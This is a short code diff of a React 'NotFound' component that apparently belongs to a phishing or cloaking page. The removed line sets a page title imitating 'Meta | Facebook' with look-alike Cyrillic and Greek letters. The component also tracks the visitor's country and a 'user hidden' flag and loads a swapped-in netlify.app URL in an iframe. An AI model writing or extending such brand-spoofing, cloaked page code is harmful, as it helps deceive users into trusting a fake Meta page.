@@ -7,8 +7,8 @@ import MetaIcon from '../resources/favicon2.ico';
 function NotFound() {
   let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
-  let[IframeUrl, SetIframeUrl] = useState('https://google.com/');
-  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Мeta | Faceboοk');
+  let[IframeUrl, SetIframeUrl] = useState('https://glittering-caramel-84e3c4.netlify.app');
+  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Market | AI');
   let[SiteTitleHome, SetSiteTitleHome] = useState('Home Page');
 
 
